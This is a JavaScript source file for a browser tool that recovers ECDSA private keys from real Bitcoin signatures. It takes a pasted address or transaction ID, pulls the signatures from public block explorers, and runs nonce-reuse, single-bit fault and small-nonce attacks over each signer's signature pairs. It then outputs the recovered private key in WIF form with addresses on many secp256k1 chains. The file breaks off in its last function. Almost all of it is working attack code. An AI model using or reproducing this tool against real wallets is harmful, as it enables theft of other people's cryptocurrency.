/*
 * ECDSA fault / bit-flip differential attack -> private-key recovery.
 * Two ways to use it:
 *
 *   A) SCAN (online): paste a Bitcoin address (or a 64-char TXID) and the tool
 *      pulls the real on-chain signatures (R, S, Z) from the block explorers,
 *      then runs the fault analysis over every signature pair of each signer.
 *      Nonce reuse (same r) and single-bit nonce faults are recovered instantly.
 *   B) PASTE (offline): type the signature components (r:s:z) by hand — a
 *      correct signature and a faulty one from the same key — and recover.
 *
 * Threat model — a glitch (voltage/clock/laser/rowhammer) corrupts the secret
 * nonce k inside a hardware signer, so the same key produces a faulty signature.
 *
 *   • Single-bit nonce flip (primary):  k_faulty = k ± 2^b for one bit b.
 *       d = (delta + z0/s0 - zf/sf) / (rf/sf - r0/s0) mod n,  delta = ±2^b,
 *       sweeping b = 0..255 and both signs (512 candidates).
 *   • Nonce reused by the fault (same r on both):  k = (z0 - zf)/(s0 - sf),
 *       d = (s0*k - z0)/r.
 *   • Nonce collapsed to a small/known value:  d = (s*k - z)/r.
 *
 * Every candidate is ACCEPTED only when it is self-consistent — the implied
 * nonce k reproduces the signature's r (x(k*G) mod n == r) — and, when a public
 * key is known, when d*G equals it. No false positives, no guessing.
 *
 * Multi-chain: a recovered secp256k1 key derives addresses for every
 * secp256k1-based chain (Bitcoin-family P2PKH, EVM + TRON via keccak-256, XRP
 * via hash160 + the XRP base58 alphabet). Solana / TON / Sui use Ed25519 and
 * are excluded with a clear message.
 *
 * Depends only on CryptoJS (loaded before this file). Exposes
 * window.processTxid (scan), window.processPaste (offline paste),
 * window.exportOne.
 */
(function () {
    "use strict";

    const ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
    const XRP_ALPHABET = "rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz";
    const N = BigInt('0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141');
    const SMALL_K_MAX = 131071n;   // 2^17 - 1: bounded sweep for a collapsed nonce

    // ---- Chain registry --------------------------------------------------
    var CHAINS = {
        bitcoin:        { name: 'Bitcoin',      kind: 'p2pkh',   version: '00' },
        ethereum:       { name: 'Ethereum',     kind: 'evm' },
        bnb:            { name: 'BNB Chain',    kind: 'evm' },
        arbitrum:       { name: 'Arbitrum',     kind: 'evm' },
        optimism:       { name: 'Optimism',     kind: 'evm' },
        base:           { name: 'Base',         kind: 'evm' },
        polygon:        { name: 'Polygon',      kind: 'evm' },
        avalanche:      { name: 'Avalanche',    kind: 'evm' },
        zksync:         { name: 'zkSync Era',   kind: 'evm' },
        solana:         { name: 'Solana',       kind: 'ed25519' },
        tron:           { name: 'Tron',         kind: 'tron' },
        toncoin:        { name: 'TON',          kind: 'ed25519' },
        sui:            { name: 'Sui',          kind: 'ed25519' },
        xrp:            { name: 'XRP',          kind: 'xrp' },
        litecoin:       { name: 'Litecoin',     kind: 'p2pkh',   version: '30' },
        'bitcoin-cash': { name: 'Bitcoin Cash', kind: 'p2pkh',   version: '00' },
        dogecoin:       { name: 'Dogecoin',     kind: 'p2pkh',   version: '1e' },
        zcash:          { name: 'Zcash',        kind: 'zcash',   version: '1cb8' }
    };
    function chainInfo(c) { return CHAINS[c] || CHAINS.bitcoin; }

    // ---- secp256k1 math --------------------------------------------------
    const P_CURVE = (2n ** 256n) - (2n ** 32n) - 977n;
    const Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798n;
    const Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8n;

    function mod(a, m) { var r = a % m; return r < 0n ? r + m : r; }
    function egcd(a, b) { if (b === 0n) return [a, 1n, 0n]; var r = egcd(b, a % b); return [r[0], r[2], r[1] - (a / b) * r[2]]; }
    function modInv(a, m) { a = mod(a, m); var r = egcd(a, m); if (r[0] !== 1n) throw new Error("no inverse"); return mod(r[1], m); }
    function ptAdd(Pp, Qp) {
        if (!Pp) return Qp; if (!Qp) return Pp;
        if (Pp.x === Qp.x && mod(Pp.y + Qp.y, P_CURVE) === 0n) return null;
        var l;
        if (Pp.x === Qp.x && Pp.y === Qp.y) { l = mod((3n * Pp.x * Pp.x) * modInv(2n * Pp.y, P_CURVE), P_CURVE); }
        else { l = mod((Qp.y - Pp.y) * modInv(mod(Qp.x - Pp.x, P_CURVE), P_CURVE), P_CURVE); }
        var x = mod(l * l - Pp.x - Qp.x, P_CURVE);
        var y = mod(l * (Pp.x - x) - Pp.y, P_CURVE);
        return { x: x, y: y };
    }
    function sMul(k) {
        k = mod(k, N); var R = null; var A = { x: Gx, y: Gy };
        while (k > 0n) { if (k & 1n) R = ptAdd(R, A); A = ptAdd(A, A); k >>= 1n; }
        return R;
    }
    function hx(b) { var s = b.toString(16); while (s.length < 64) s = "0" + s; return s; }
    function compressPoint(Q) { return (Q.y & 1n ? "03" : "02") + hx(Q.x); }
    function pubFromPriv(d) { return compressPoint(sMul(d)); }
    function pubsFromPriv(d) {
        var Q = sMul(d);
        var x = hx(Q.x), y = hx(Q.y);
        return { cpub: (Q.y & 1n ? "03" : "02") + x, upub: "04" + x + y };
    }
    function compressPub(pub) {
        pub = (pub || "").toLowerCase();
        if (pub.length === 66 && (pub.slice(0, 2) === "02" || pub.slice(0, 2) === "03")) return pub;
        if (pub.length === 130 && pub.slice(0, 2) === "04") {
            var y = BigInt("0x" + pub.slice(66));
            return (y & 1n ? "03" : "02") + pub.slice(2, 66);
        }
        return null;
    }
    // Does nonce k really produce this r?  x(k*G) mod n == r
    function nonceFitsR(k, r) {
        if (k <= 0n || k >= N) return false;
        var Q = sMul(k);
        return !!Q && mod(Q.x, N) === r;
    }

    // ---- Hashing / address (CryptoJS) -----------------------------------
    function sha256hex(hex) { return CryptoJS.SHA256(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function ripe160hex(hex) { return CryptoJS.RIPEMD160(CryptoJS.enc.Hex.parse(hex)).toString(); }
    function dblsha256(hex) { return sha256hex(sha256hex(hex)); }
    function b58encode(hex, alphabet) {
        var A = alphabet || ALPHABET;
        let num = BigInt("0x" + hex);
        let str = "";
        while (num > 0) { str = A[Number(num % 58n)] + str; num /= 58n; }
        for (let i = 0; i < hex.length; i += 2) { if (hex.substring(i, i + 2) === "00") str = A[0] + str; else break; }
        return str;
    }
    function hash160ToAddress(hash160, version_byte) {
        const versioned = version_byte + hash160;
        const checksum = CryptoJS.SHA256(CryptoJS.SHA256(CryptoJS.enc.Hex.parse(versioned))).toString().substring(0, 8);
        return b58encode(versioned + checksum);
    }
    function addrFromPub(pubHex, version) { return hash160ToAddress(ripe160hex(sha256hex(pubHex)), version); }
    function pubToAddr_P2PKH(pub_hex) { return addrFromPub(pub_hex, "00"); }
    function privToWif(d) {
        var payload = "80" + hx(d) + "01";
        return b58encode(payload + dblsha256(payload).substring(0, 8));
    }

    // ---- keccak-256 (EVM / TRON) ----------------------------------------
    var KECCAK_RC = [0x0000000000000001n, 0x0000000000008082n, 0x800000000000808an, 0x8000000080008000n, 0x000000000000808bn, 0x0000000080000001n, 0x8000000080008081n, 0x8000000000008009n, 0x000000000000008an, 0x0000000000000088n, 0x0000000080008009n, 0x000000008000000an, 0x000000008000808bn, 0x800000000000008bn, 0x8000000000008089n, 0x8000000000008003n, 0x8000000000008002n, 0x8000000000000080n, 0x000000000000800an, 0x800000008000000an, 0x8000000080008081n, 0x8000000000008080n, 0x0000000080000001n, 0x8000000080008008n];
    var KECCAK_RHO = [1, 3, 6, 10, 15, 21, 28, 36, 45, 55, 2, 14, 27, 41, 56, 8, 25, 43, 62, 18, 39, 61, 20, 44];
    var KECCAK_PILN = [10, 7, 11, 17, 18, 3, 5, 16, 8, 21, 24, 4, 15, 23, 19, 13, 12, 2, 20, 14, 22, 9, 6, 1];
    var M64 = (1n << 64n) - 1n;
    function kRol(x, s) { s = s % 64n; return s === 0n ? x : ((x << s) | (x >> (64n - s))) & M64; }
    function keccakF(a) {
        var B = new Array(25).fill(0n), C = [0n, 0n, 0n, 0n, 0n], x, y, i, t, j, v, D;
        for (var round = 0; round < 24; round++) {
            for (x = 0; x < 5; x++) C[x] = a[x] ^ a[x + 5] ^ a[x + 10] ^ a[x + 15] ^ a[x + 20];
            for (x = 0; x < 5; x++) {
                D = C[(x + 4) % 5] ^ kRol(C[(x + 1) % 5], 1n);
                for (y = 0; y < 5; y++) a[x + 5 * y] ^= D;
            }
            t = a[1];
            for (x = 0; x < 24; x++) {
                j = KECCAK_PILN[x]; v = a[j];
                a[j] = kRol(t, BigInt(KECCAK_RHO[x]));
                t = v;
            }
            for (y = 0; y < 5; y++) {
                for (x = 0; x < 5; x++) B[x + 5 * y] = a[x + 5 * y] ^ ((~a[(x + 1) % 5 + 5 * y]) & a[(x + 2) % 5 + 5 * y]);
            }
            for (i = 0; i < 25; i++) a[i] = B[i];
            a[0] ^= KECCAK_RC[round];
        }
    }
    function keccak256Hex(bytes) {
        var rate = 136, st = new BigUint64Array(25), buf = new Uint8Array(bytes);
        var full = Math.floor(buf.length / rate), b, i, off, k, lane;
        for (b = 0; b < full; b++) {
            for (i = 0; i < rate / 8; i++) {
                off = b * rate + i * 8; lane = 0n;
                for (k = 7; k >= 0; k--) lane = (lane << 8n) | BigInt(buf[off + k]);
                st[i] ^= lane;
            }
            keccakF(st);
        }
        var rem = buf.length - full * rate, last = new Uint8Array(rate);
        last.set(buf.subarray(full * rate));
        last[rem] ^= 0x01; last[rate - 1] ^= 0x80;
        for (i = 0; i < rate / 8; i++) {
            off = i * 8; lane = 0n;
            for (k = 7; k >= 0; k--) lane = (lane << 8n) | BigInt(last[off + k]);
            st[i] ^= lane;
        }
        keccakF(st);
        var out = new Uint8Array(32);
        for (i = 0; i < 4; i++) {
            lane = st[i];
            for (k = 0; k < 8; k++) { out[i * 8 + k] = Number(lane & 0xffn); lane >>= 8n; }
        }
        var hex = "";
        for (i = 0; i < out.length; i++) hex += out[i].toString(16).padStart(2, "0");
        return hex;
    }

    // ---- Multi-chain address derivation ---------------------------------
    function chainAddresses(pk, c) {
        var info = chainInfo(c);
        if (info.kind === 'p2pkh' || info.kind === 'zcash') {
            return [addrFromPub(pk.cpub, info.version), addrFromPub(pk.upub, info.version)];
        }
        if (info.kind === 'evm' || info.kind === 'tron') {
            var k = keccak256Hex(bytesOfHex(pk.upub.slice(2))).slice(-40);
            if (info.kind === 'tron') return [b58encode("41" + k + dblsha256("41" + k).slice(0, 8))];
            return ["0x" + k.toLowerCase()];
        }
        if (info.kind === 'xrp') {
            var h = ripe160hex(sha256hex(pk.cpub));
            return [b58encode("00" + h + dblsha256("00" + h).slice(0, 8), XRP_ALPHABET)];
        }
        return [];
    }
    function bytesOfHex(h) {
        var out = new Uint8Array(h.length / 2);
        for (var i = 0; i < out.length; i++) out[i] = parseInt(h.substring(i * 2, i * 2 + 2), 16);
        return out;
    }

    // ---- Direct-input parsing -------------------------------------------
    function isHex(t) { return /^[0-9a-fA-F]+$/.test(t); }
    function toBig(t) {
        t = t.trim();
        if (/^0x/i.test(t)) return BigInt(t);
        if (/^[0-9]+$/.test(t) && t.length < 40) return BigInt(t);
        return BigInt("0x" + t);
    }
    function parseFaultInput(text) {
        const out = { sigs: [], pub: null, knownK: null };
        const lines = String(text || '').split(/[\r\n]+/);
        for (let raw of lines) {
            let line = raw.replace(/(#|\/\/).*$/, '').trim();
            if (!line) continue;
            const tokens = line.split(/[\s,:=]+/).filter(Boolean);
            if (!tokens.length) continue;
            const head = tokens[0].toLowerCase();
            if (head === 'pub' || head === 'pubkey' || head === 'publickey') {
                if (tokens[1] && isHex(tokens[1])) out.pub = tokens[1].toLowerCase();
                continue;
            }
            if (head === 'k' || head === 'nonce') {
                if (tokens[1]) { try { out.knownK = toBig(tokens[1]); } catch (e) { } }
                continue;
            }
            const hexTokens = tokens.filter(isHex);
            if (hexTokens.length === 1 && (hexTokens[0].length === 66 || hexTokens[0].length === 130)) {
                out.pub = hexTokens[0].toLowerCase();
                continue;
            }
            if (hexTokens.length >= 3) {
                out.sigs.push({ r: hexTokens[0].toLowerCase(), s: hexTokens[1].toLowerCase(), z: hexTokens[2].toLowerCase() });
            }
        }
        return out;
    }

    // ---- Recovery core ---------------------------------------------------
    function accept(d, checkSig, pub) {
        if (d <= 0n || d >= N) return false;
        if (pub) { var cp = compressPub(pub); if (cp) return pubFromPriv(d) === cp; }
        var k = mod((checkSig.z + checkSig.r * d) * modInv(checkSig.s, N), N);
        return nonceFitsR(k, checkSig.r);
    }
    function pack(d, kBig, mode) {
        var pub = pubFromPriv(d);
        return { priv: hx(d), wif: privToWif(d), k: (kBig != null ? hx(kBig) : ''), pub: pub, addr: pubToAddr_P2PKH(pub), mode: mode };
    }
    function recoverBitFlip(A, B, pub) {
        try {
            const r0 = BigInt("0x" + A.r), s0 = BigInt("0x" + A.s), z0 = BigInt("0x" + A.z);
            const rf = BigInt("0x" + B.r), sf = BigInt("0x" + B.s), zf = BigInt("0x" + B.z);
            const s0i = modInv(s0, N), sfi = modInv(sf, N);
            const denom = mod(rf * sfi - r0 * s0i, N);
            if (denom === 0n) return null;
            const denomInv = modInv(denom, N);
            const base = mod(z0 * s0i - zf * sfi, N);
            for (let b = 0n; b < 256n; b++) {
                const pow = 1n << b;
                for (const sg of [1n, -1n]) {
                    const delta = mod(sg * pow, N);
                    const d = mod((delta + base) * denomInv, N);
                    if (accept(d, A, pub)) {
                        const k = mod((z0 + r0 * d) * s0i, N);
                        return pack(d, k, 'Single-bit nonce fault (bit ' + b + ', ' + (sg > 0n ? '+' : '−') + '2^' + b + ')');
                    }
                }
            }
        } catch (e) { }
        return null;
    }
    function recoverReuse(A, B, pub) {
        try {
            const r = BigInt("0x" + A.r);
            const s1 = BigInt("0x" + A.s), z1 = BigInt("0x" + A.z);
            const s2 = BigInt("0x" + B.s), z2 = BigInt("0x" + B.z);
            const rInv = modInv(r, N);
            const dz = mod(z1 - z2, N);
            const kCands = [];
            if (mod(s1 - s2, N) !== 0n) kCands.push(mod(dz * modInv(mod(s1 - s2, N), N), N));
            if (mod(s1 + s2, N) !== 0n) kCands.push(mod(dz * modInv(mod(s1 + s2, N), N), N));
            for (const k of kCands) {
                const dCands = [mod(mod(s1 * k - z1, N) * rInv, N), mod(mod(mod(-s1, N) * k - z1, N) * rInv, N)];
                for (const d of dCands) {
                    if (accept(d, A, pub)) return pack(d, k, 'Nonce reused by fault (identical r)');
                }
            }
        } catch (e) { }
        return null;
    }
    function recoverKnownOrSmall(A, pub, knownK) {
        try {
            const r = BigInt("0x" + A.r), s = BigInt("0x" + A.s), z = BigInt("0x" + A.z);
            const rInv = modInv(r, N);
            const test = function (k) {
                const d = mod(mod(s * k - z, N) * rInv, N);
                if (accept(d, A, pub)) return pack(d, k, knownK != null ? 'Known faulty nonce k' : 'Collapsed nonce (small-k sweep)');
                const d2 = mod(mod(mod(-s, N) * k - z, N) * rInv, N);
                if (accept(d2, A, pub)) return pack(d2, k, knownK != null ? 'Known faulty nonce k' : 'Collapsed nonce (small-k sweep)');
                return null;
            };
            if (knownK != null) { const hit = test(mod(knownK, N)); if (hit) return hit; }
            for (let k = 1n; k <= SMALL_K_MAX; k++) {
                if (nonceFitsR(k, r)) { const hit = test(k); if (hit) return hit; }
            }
        } catch (e) { }
        return null;
    }
    function runRecovery(parsed) {
        const sigs = parsed.sigs, pub = parsed.pub;
        if (sigs.length >= 2) {
            const A = sigs[0], B = sigs[1];
            if (A.r.toLowerCase() === B.r.toLowerCase()) {
                return recoverReuse(A, B, pub) || recoverBitFlip(A, B, pub);
            }
            return recoverBitFlip(A, B, pub) || recoverReuse(A, B, pub) ||
                recoverKnownOrSmall(A, pub, parsed.knownK);
        }
        if (sigs.length === 1) {
            return recoverKnownOrSmall(sigs[0], pub, parsed.knownK);
        }
        return null;
    }

    // ---- On-chain signature extraction (Bitcoin tx format) ---------------
    function reverseHex(hex) { return hex.match(/.{1,2}/g).reverse().join(''); }
    function le64(v) { let hex = BigInt(v || 0).toString(16); while (hex.length < 16) hex = '0' + hex; return hex.match(/.{1,2}/g).reverse().join(''); }
    function readVarInt(buf, offset) {
        let prefix = buf[offset];
        if (prefix < 0xFD) return { val: prefix, size: 1 };
        if (prefix === 0xFD) return { val: buf[offset + 1] | (buf[offset + 2] << 8), size: 3 };
        return { val: buf[offset + 1], size: 9 };
    }
    function tryParseDerAt(buf, pos) {
        if (!buf || pos + 7 > buf.length) return null;
        try {
            if (buf[pos] !== 0x30) return null;
            const total_len = buf[pos + 1];
            if (total_len < 6) return null;
            const end = pos + 2 + total_len;
            if (end > buf.length) return null;
            if (buf[pos + 2] !== 0x02) return null;
            const r_len = buf[pos + 3];
            const r_start = pos + 4;
            const r_end = r_start + r_len;
            if (r_end >= buf.length || r_end >= end) return null;
            if (buf[r_end] !== 0x02) return null;
            const s_len = buf[r_end + 1];
            const s_start = r_end + 2;
            const s_end = s_start + s_len;
            if (s_end > buf.length || s_end > end) return null;
            let r_hex = Buffer.from(buf.slice(r_start, r_end)).toString('hex');
            let s_hex = Buffer.from(buf.slice(s_start, s_end)).toString('hex');
            if (r_hex.startsWith('00') && r_hex.length > 2) r_hex = r_hex.substring(2);
            if (s_hex.startsWith('00') && s_hex.length > 2) s_hex = s_hex.substring(2);
            return { r: r_hex, s: s_hex, len: end - pos };
        } catch (e) { return null; }
    }
    function parseScriptSig(scr) {
        const buf = bytesOfHex(scr);
        let r = "", s = "", pub = "";
        for (let i = 0; i < buf.length - 10; i++) {
            const maybe = tryParseDerAt(buf, i);
            if (maybe) {
                r = maybe.r; s = maybe.s;
                let nextPos = i + maybe.len + 1;
                if (nextPos < buf.length) {
                    let pubPushLen = buf[nextPos];
                    if ((pubPushLen === 33 || pubPushLen === 65) && nextPos + 1 + pubPushLen <= buf.length) {
                        pub = Buffer.from(buf.slice(nextPos + 1, nextPos + 1 + pubPushLen)).toString('hex');
                        if (!pub.startsWith("02") && !pub.startsWith("03") && !pub.startsWith("04")) pub = "";
                    }
                }
                if (r && s) break;
            }
        }
        if (!pub) {
            for (let i = 0; i < buf.length - 33; i++) {
                let len = buf[i];
                if (len === 33 || len === 65) {
                    let potential = Buffer.from(buf.slice(i + 1, i + 1 + len)).toString('hex');
                    if (potential.startsWith("02") || potential.startsWith("03") || potential.startsWith("04")) {
                        pub = potential; break;
                    }
                }
            }
        }
        return { r, s, pub };
    }
    function parseDER(hex) {
        try {
            if (hex.endsWith("01") || hex.endsWith("81") || hex.endsWith("02") || hex.endsWith("82") || hex.endsWith("03") || hex.endsWith("83")) {
                hex = hex.substring(0, hex.length - 2);
            }
            let cursor = 0;
            if (hex.substring(cursor, cursor + 2) !== "30") return {}; cursor += 2;
            cursor += 2;
            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const rLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let r = hex.substring(cursor, cursor + rLen); cursor += rLen;
            if (r.startsWith("00")) r = r.substring(2);
            if (hex.substring(cursor, cursor + 2) !== "02") return {}; cursor += 2;
            const sLen = parseInt(hex.substring(cursor, cursor + 2), 16) * 2; cursor += 2;
            let s = hex.substring(cursor, cursor + sLen);
            if (s.startsWith("00")) s = s.substring(2);
            return { r, s };
        } catch (e) { return {}; }
    }
    function parseHexTransaction(txRaw) {
        const buf = bytesOfHex(txRaw);
        let cursor = 0;
        const version = Buffer.from(buf.slice(cursor, cursor + 4)).toString('hex'); cursor += 4;
        let isSegwit = false;
        if (buf[cursor] === 0x00 && buf[cursor + 1] === 0x01) { isSegwit = true; cursor += 2; }
        const inCountData = readVarInt(buf, cursor); cursor += inCountData.size;
        const inputs = [];
        for (let i = 0; i < inCountData.val; i++) {
            const pre_raw = Buffer.from(buf.slice(cursor, cursor + 32)).toString('hex'); cursor += 32;
            const vout_raw = Buffer.from(buf.slice(cursor, cursor + 4)).toString('hex'); cursor += 4;
            const scriptLen = readVarInt(buf, cursor); cursor += scriptLen.size;
            const script_hex = Buffer.from(buf.slice(cursor, cursor + scriptLen.val)).toString('hex'); cursor += scriptLen.val;
            const seq_raw = Buffer.from(buf.slice(cursor, cursor + 4)).toString('hex'); cursor += 4;
            inputs.push({ pre_raw, vout_raw, script_hex, seq_raw });
        }
        const outCountData = readVarInt(buf, cursor); cursor += outCountData.size;
        const outputs = [];
        for (let i = 0; i < outCountData.val; i++) {
            const value_raw = Buffer.from(buf.slice(cursor, cursor + 8)).toString('hex'); cursor += 8;
            const outScriptLen = readVarInt(buf, cursor); cursor += outScriptLen.size;
            const script_hex = Buffer.from(buf.slice(cursor, cursor + outScriptLen.val)).toString('hex'); cursor += outScriptLen.val;
            const script_len_raw = (outScriptLen.size === 1 ? outScriptLen.val.toString(16).padStart(2, '0') : "fd" + reverseHex(outScriptLen.val.toString(16).padStart(4, '0')));
            outputs.push({ value_raw, script_len_raw, script_hex });
        }
        if (isSegwit) {
            for (let i = 0; i < inCountData.val; i++) {
                const witnessCount = readVarInt(buf, cursor); cursor += witnessCount.size;
                const witnesses = [];
                for (let j = 0; j < witnessCount.val; j++) {
                    const itemLen = readVarInt(buf, cursor); cursor += itemLen.size;
                    witnesses.push(Buffer.from(buf.slice(cursor, cursor + itemLen.val)).toString('hex')); cursor += itemLen.val;
                }
                inputs[i].witness = witnesses;
            }
        }
        const locktime_raw = Buffer.from(buf.slice(cursor, cursor + 4)).toString('hex');
        return { version, inputs, outputs, locktime_raw, isSegwit };
    }
    function getrsz_v2(fullTx, inputIndex, scriptPubKey) {
        let e = fullTx.version;
        let inCount = fullTx.inputs.length;
        let inCountHex = (inCount < 253) ? inCount.toString(16).padStart(2, '0') :
            (inCount < 65536) ? "fd" + reverseHex(inCount.toString(16).padStart(4, '0')) :
                "fe" + reverseHex(inCount.toString(16).padStart(8, '0'));
        e += inCountHex;
        for (let i = 0; i < inCount; i++) {
            const inp = fullTx.inputs[i];
            e += inp.pre_raw;
            e += inp.vout_raw;
            if (i === inputIndex) {
                const spk = scriptPubKey || "";
                const spkLen = (spk.length / 2);
                const spkLenHex = (spkLen < 253) ? spkLen.toString(16).padStart(2, '0') :
                    (spkLen < 65536) ? "fd" + reverseHex(spkLen.toString(16).padStart(4, '0')) :
                        "fe" + reverseHex(spkLen.toString(16).padStart(8, '0'));
                e += spkLenHex + spk;
            } else {
                e += "00";
            }
            e += inp.seq_raw;
        }
        let outCount = fullTx.outputs.length;
        let outCountHex = (outCount < 253) ? outCount.toString(16).padStart(2, '0') : "fd" + reverseHex(outCount.toString(16).padStart(4, '0'));
        e += outCountHex;
        for (let out of fullTx.outputs) e += out.value_raw + out.script_len_raw + out.script_hex;
        e += fullTx.locktime_raw + "01000000";
        return dblsha256(e);
    }
    function bip143Sighash(fullTx, inputIndex, scriptCode, amount) {
        let prevouts = '';
        for (const inp of fullTx.inputs) prevouts += inp.pre_raw + inp.vout_raw;
        const hashPrevouts = dblsha256(prevouts);
        let seqs = '';
        for (const inp of fullTx.inputs) seqs += inp.seq_raw;
        const hashSequence = dblsha256(seqs);
        let outs = '';
        for (const out of fullTx.outputs) outs += out.value_raw + out.script_len_raw + out.script_hex;
        const hashOutputs = dblsha256(outs);
        const pre = fullTx.version + hashPrevouts + hashSequence +
            fullTx.inputs[inputIndex].pre_raw + fullTx.inputs[inputIndex].vout_raw +
            scriptCode + le64(amount) +
            fullTx.inputs[inputIndex].seq_raw + hashOutputs + fullTx.locktime_raw + "01000000";
        return dblsha256(pre);
    }
    async function getrsz(parsed, txid) {
        const results = [];
        let prevouts = null;
        if (parsed.isSegwit && txid) {
            prevouts = await fetchPrevouts(txid);
        }
        for (let i = 0; i < parsed.inputs.length; i++) {
            const inp = parsed.inputs[i];
            let r, s, pub;
            if (inp.script_hex) {
                const sigData = parseScriptSig(inp.script_hex);
                if (sigData.r) { r = sigData.r; s = sigData.s; pub = sigData.pub; }
            }
            if (!r && inp.witness && inp.witness.length >= 2) {
                const der = parseDER(inp.witness[0]);
                if (der.r) { r = der.r; s = der.s; pub = inp.witness[1]; }
            }
            if (!r || !s || !pub) continue;
            const pubHash160 = ripe160hex(sha256hex(pub));
            const scriptPubKey = "76a914" + pubHash160 + "88ac";
            let z;
            if (parsed.isSegwit && prevouts && prevouts[i] != null) {
                z = bip143Sighash(parsed, i, "19" + scriptPubKey, prevouts[i]);
            } else {
                z = getrsz_v2(parsed, i, scriptPubKey);
            }
            results.push({ input_index: i, addr: pubToAddr_P2PKH(pub), r, s, z, pub });
        }
        return results;
    }

    // ---- Network ---------------------------------------------------------
    async function getRawTx(txid) {
        const urls = [
            `https://blockstream.info/api/tx/${txid}/hex`,
            `https://blockchain.info/rawtx/${txid}?format=hex`
        ];
        for (let url of urls) {
            try {
                const response = await fetch(url, { signal: AbortSignal.timeout(6000) });
                if (response.ok) {
                    const rawtx = await response.text();
                    if (rawtx && rawtx.length > 50 && !rawtx.includes("not found") && !rawtx.startsWith("<!DOCTYPE")) {
                        return rawtx.trim();
                    }
                }
            } catch (e) { }
            await new Promise(r => setTimeout(r, 300));
        }
        throw new Error(`Could not fetch raw TX ${txid.substring(0, 8)}. Please wait and retry.`);
    }
    async function fetchPrevouts(txid) {
        try {
            const resp = await fetch(`https://blockstream.info/api/tx/${txid}`, { signal: AbortSignal.timeout(8000) });
            if (resp.ok) {
                const d = await resp.json();
                if (Array.isArray(d.vin)) {
                    return d.vin.map(function (v) {
                        return (v.prevout && typeof v.prevout.value === 'number') ? v.prevout.value : null;
                    });
                }
            }
        } catch (e) { }
        try {
            const resp = await fetch(`https://blockchain.info/rawtx/${txid}?format=json`, { signal: AbortSignal.timeout(8000) });
            if (resp.ok) {
                const d = await resp.json();
                if (Array.isArray(d.inputs)) {
                    return d.inputs.map(function (v) {
                        return (v.prev_out && typeof v.prev_out.value === 'number') ? v.prev_out.value : null;
                    });
                }
            }
        } catch (e) { }
        return null;
    }
    async function fetchAddressTxids(addr, want, onProgress) {
        let anyOk = false;
        try {
            let txids = [];
            let lastSeen = '';
            let guard = 0;
            while (txids.length < want && guard < 5000) {
                guard++;
                const url = lastSeen
                    ? `https://blockstream.info/api/address/${addr}/txs/chain/${lastSeen}`
                    : `https://blockstream.info/api/address/${addr}/txs/chain`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const arr = await resp.json();
                if (!Array.isArray(arr) || arr.length === 0) break;
                for (const t of arr) txids.push(t.txid);
                lastSeen = arr[arr.length - 1].txid;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: want });
                if (arr.length < 25) break;
                await new Promise(r => setTimeout(r, 120));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];
        } catch (e) { }
        try {
            let txids = [];
            let total = null;
            let offset = 0;
            const PAGE = 50;
            while (txids.length < want) {
                const pageLimit = Math.min(PAGE, want - txids.length);
                const url = `https://blockchain.info/rawaddr/${addr}?limit=${pageLimit}&offset=${offset}&cors=true`;
                const resp = await fetch(url, { signal: AbortSignal.timeout(15000) });
                if (!resp.ok) break;
                anyOk = true;
                const data = await resp.json();
                if (!data || !Array.isArray(data.txs)) break;
                if (total === null) total = data.n_tx || 0;
                if (data.txs.length === 0) break;
                for (const tx of data.txs) txids.push(tx.hash);
                offset += data.txs.length;
                if (onProgress) onProgress({ phase: 'list', listed: txids.length, target: Math.min(want, total || want) });
                if (total && offset >= total) break;
                if (data.txs.length < pageLimit) break;
                await new Promise(r => setTimeout(r, 150));
            }
            if (txids.length > 0) return txids.slice(0, want);
            if (anyOk) return [];
        } catch (e) { }
        return anyOk ? [] : null;
    }
    async function fetchAddressSignatures(addr, want, onProgress) {
        want = Math.max(1, parseInt(want, 10) || 100);
        const results = [];
        const txHashes = await fetchAddressTxids(addr, want, onProgress);
        if (txHashes === null) {
            throw new Error("Couldn't reach a block explorer (rate-limiting?). Wait a few seconds and retry, or lower the count.");
        }
        if (txHashes.length === 0) return results;
        const target = txHashes.length;
        let scanned = 0;
        const BATCH = 4;
        for (let b = 0; b < txHashes.length; b += BATCH) {
            const slice = txHashes.slice(b, b + BATCH);
            const settled = await Promise.all(slice.map(async (h) => {
                try {
                    const raw = await getRawTx(h);
                    const parsed = parseHexTransaction(raw);
                    const matched = await getrsz(parsed, h);
                    matched.forEach(it => { it.txid = h; });
                    return matched;
                } catch (e) { return []; }
            }));
            settled.forEach(arr => { for (const it of arr) results.push(it); });
            scanned += slice.length;
            if (onProgress) onProgress({ phase: 'scan', scanned: scanned, target: target, found: results.length });
            await new Promise(r => setTimeout(r, 120));
        }
        return results;
    }

    // ---- Scan analysis: run fault recovery over on-chain signature pairs --
    function analyzeSignatures(sigs) {
        // Group by public key so we only compare signatures from the same signer.
        var groups = {};
        for (var i = 0; i < sigs.length; i++) {
            var e = sigs[i];
            if (!groups[e.pub]) groups[e.pub] = [];
            groups[e.pub].push(e);
        }
        var out = { hit: null, pair: null, checked: 0, groups: Object.keys(groups).length };
        for (var pub in groups) {
            var arr = groups[pub];
            for (var a = 0; a < arr.length; a++) {
                for (var b = a + 1; b < arr.length; b++) {
                    out.checked++;
                    var parsed = { sigs: [arr[a], arr[b]], pub: arr[a].pub, knownK: null };
                    var hit = runRecovery(parsed);
                    if (hit) { out.hit = hit; out.pair = [arr[a], arr[b]]; return out; }
                }
                // single signature with a collapsed nonce
                var single = recoverKnownOrSmall(arr[a], arr[a].pub, null);
                if (single) { out.hit = single; out.pair = [arr[a]]; return out; }
            }
        }
        return out;
    }

    // ---- Output header + export ------------------------------------------
    function getOutputHeader(elementId) {
